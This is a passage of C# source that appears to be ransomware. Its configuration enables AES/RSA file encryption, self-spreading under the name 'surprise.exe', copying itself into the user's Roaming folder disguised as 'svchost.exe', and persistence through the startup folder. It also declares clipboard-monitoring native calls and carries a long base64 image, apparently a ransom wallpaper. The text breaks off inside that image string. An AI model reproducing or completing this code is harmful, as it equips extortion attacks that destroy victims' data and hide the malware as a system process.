using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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